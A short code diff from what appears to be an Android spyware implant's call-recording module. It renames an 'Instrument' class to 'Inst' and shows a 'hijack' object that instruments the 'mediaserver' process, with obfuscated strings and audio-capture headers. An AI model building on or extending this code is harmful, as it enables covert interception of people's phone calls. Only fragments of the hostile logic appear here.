@@ -19,7 +19,6 @@ import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
-import com.android.dvci.conf.Configuration;
 import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
@@ -40,7 +39,7 @@ import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.ICallBack;
-import com.android.dvci.util.Instrument;
+import com.android.dvci.util.Inst;
 import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
@@ -85,7 +84,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
 	private CallBack hjcb;
-	private Instrument hijack;
+	private Inst hijack;
 
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
@@ -303,7 +302,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb = new CallBack();
 		hjcb.register(new HijackCallBack());
 
-		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
+		hijack = new Inst(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
 		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
